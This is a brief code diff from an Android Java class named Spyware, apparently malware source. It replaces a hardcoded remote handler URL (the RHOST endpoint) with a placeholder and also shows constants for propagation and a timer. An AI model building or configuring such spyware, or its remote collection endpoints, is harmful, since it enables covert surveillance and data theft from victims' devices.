@@ -32,7 +32,7 @@ import android.util.Log;
 public class Spyware {
     public static final boolean DEV_MODE  = true;
     public static final String  PROPAGATE = "<PROPAGATE>";
-    public static final String  RHOST     = "http://basmati.ambersail.net/handler.php";
+    public static final String  RHOST     = "<RHOST>";
     public static final String  TAG       = "::trace";
     public static final int     TIMER     = 30;
     private Context context;
